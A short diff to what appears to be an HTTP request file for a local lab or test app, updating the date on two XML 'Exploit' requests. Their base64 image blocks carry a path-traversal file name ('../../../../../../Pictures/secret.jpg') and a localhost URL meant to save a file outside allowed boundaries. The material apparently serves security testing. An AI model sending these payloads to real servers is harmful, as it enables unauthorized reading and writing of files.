@@ -174,7 +174,7 @@ Host: localhost:3001
 Content-Type: text/xml
 
 <?xml version='1.0'?>
-<page title="Exploit" author='2' publicationDate=''>
+<page title="Exploit" author='2' publicationDate='2024-01-01'>
     <block type='header'>Show this image from outside the boundaries</block>
     <!-- {"fileName":"../../../../../../Pictures/secret.jpg" } -->
     <block type='image'>eyJmaWxlTmFtZSI6Ii4uLy4uLy4uLy4uLy4uL1BpY3R1cmVzL3NlY3JldC5qcGciIH0=</block>
@@ -186,7 +186,7 @@ Host: localhost:3001
 Content-Type: text/xml
 
 <?xml version='1.0'?>
-<page title="Exploit" author='2' publicationDate=''>
+<page title="Exploit" author='2' publicationDate='2024-01-01'>
     <block type='header'>Save this outside the boundaries</block  >
     <!-- { "fileName": "secret", "url": "http://localhost:8080/images/secret.png" } -->
     <block type='image'>eyAiZmlsZU5hbWUiOiAic2VjcmV0IiwgInVybCI6ICJodHRwOi8vbG9jYWxob3N0OjgwODAvaW1hZ2VzL3NlY3JldC5wbmciIH0=</block>
